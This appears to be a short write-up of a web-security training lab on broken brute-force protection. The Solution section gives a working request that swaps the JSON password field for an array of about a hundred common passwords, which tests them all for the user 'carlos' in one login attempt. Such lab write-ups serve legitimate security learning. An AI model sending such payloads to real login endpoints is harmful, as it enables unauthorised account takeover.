# Lab 05 : Broken brute-force protection, multiple credentials per request

## Overview:
- Level : EXPERT
- This lab is vulnerable due to a logic flaw in its brute-force protection. To solve the lab, brute-force Carlos's password, then access his account page.

Victim's username: carlos

## Analysis:
- login request have json data for username and password


## Solution:
- capture login request
- since the data is in json format 
- change json data to following 

{"username":"carlos","password":[
	"123456", "password", "12345678", "qwerty", "123456789", "12345", "1234", "111111", "1234567", 
    "dragon", "123123", "baseball", "abc123", "football", "monkey", "letmein", "shadow", "master", 
    "666666", "qwertyuiop", "123321", "mustang", "1234567890", "michael", "654321", "superman", 
    "1qaz2wsx", "7777777", "121212", "000000", "qazwsx", "123qwe", "killer", "trustno1", "jordan", 
    "jennifer", "zxcvbnm", "asdfgh", "hunter", "buster", "soccer", "harley", "batman", "andrew", 
    "tigger", "sunshine", "iloveyou", "2000", "charlie", "robert", "thomas", "hockey", "ranger", 
    "daniel", "starwars", "klaster", "112233", "george", "computer", "michelle", "jessica", "pepper", 
    "1111", "zxcvbn", "555555", "11111111", "131313", "freedom", "777777", "pass", "maggie", "159753", 
    "aaaaaa", "ginger", "princess", "joshua", "cheese", "amanda", "summer", "love", "ashley", "nicole", 
    "chelsea", "biteme", "matthew", "access", "yankees", "987654321", "dallas", "austin", "thunder", 
    "taylor", "matrix", "mobilemail", "mom", "monitor", "monitoring", "montana", "moon", "moscow"
]}


- send that request and it gives 302 
- right click show responce in browser 